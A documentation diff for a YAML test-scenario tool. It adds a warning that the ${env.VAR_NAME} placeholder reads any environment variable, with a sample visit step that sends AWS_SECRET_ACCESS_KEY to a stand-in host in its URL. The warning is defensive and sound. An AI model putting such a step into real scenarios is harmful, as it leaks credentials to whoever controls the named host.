@@ -75,6 +75,34 @@ Strings inside any step value support these placeholders:
 | `${stripe.cvc}` | Stripe test card CVC |
 | `${stripe.pk_test}` | Stripe test publishable key |
 
+An unresolved placeholder is left in the string as written.
+
+### Treat a scenario you did not write as code
+
+`${env.VAR_NAME}` reads any variable this process can read — there is no
+allowlist — and the result can go into a URL, an `act` instruction, an email
+assertion or a `computer_use` task. A step declaring
+
+```yaml
+- action: visit
+  url: https://example.test/?k=${env.AWS_SECRET_ACCESS_KEY}
+```
+
+sends that value to the host the scenario names. That is intended for scenarios
+you wrote; it is worth knowing before you run one you copied from a template, a
+shared repository or an example bundle.
+
+Every run logs the variables a scenario read:
+
+```
+INFO  scenario read 2 environment variable(s)  variables=["AWS_SECRET_ACCESS_KEY","GITHUB_TOKEN"]
+```
+
+Their values are added to the redaction patterns, so they do not survive into
+the reports — but redaction does not stop a scenario from sending a value
+somewhere. Read the scenario, or run it with only the variables it needs in the
+environment.
+
 ## Example: critical visual assertion with escalation
 
 ```yaml
